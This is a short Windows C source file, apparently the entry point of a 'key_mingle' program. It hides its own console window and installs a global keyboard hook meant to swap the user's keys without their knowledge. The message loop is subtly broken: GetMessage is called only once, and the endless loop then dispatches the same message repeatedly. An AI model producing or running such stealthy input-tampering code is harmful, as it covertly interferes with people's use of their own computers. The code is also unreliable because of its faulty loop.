#include <stdio.h>
#include <stdlib.h>
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include "key_mingle.h"

HHOOK keyboardHook;
extern char keyCodes[256][2];//array of keys to swap

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrefInstance, LPSTR lpCmdLine, int nCmdShhow){
    //hide the window
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window,0);

    SetHook(&keyboardHook);
    MSG msg;
    GetMessage(&msg, NULL, 0, 0);
    for (;;){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}
